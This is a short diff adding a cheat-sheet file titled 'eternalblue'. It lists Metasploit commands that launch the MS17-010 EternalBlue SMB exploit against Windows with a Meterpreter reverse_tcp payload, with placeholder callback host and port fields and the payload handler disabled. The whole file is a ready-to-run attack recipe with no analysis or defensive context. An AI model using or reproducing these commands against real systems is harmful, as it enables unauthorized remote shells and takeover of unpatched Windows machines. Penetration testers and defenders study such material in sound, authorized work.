@@ -1,0 +1,11 @@
+eternalblue
+----------
+use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/reverse_tcp
+#set payload windows/meterpreter/reverse_tcp
+set lhost <>
+set lport <>
+set DisablePayloadHandler True
+run
+
+++++++++++  
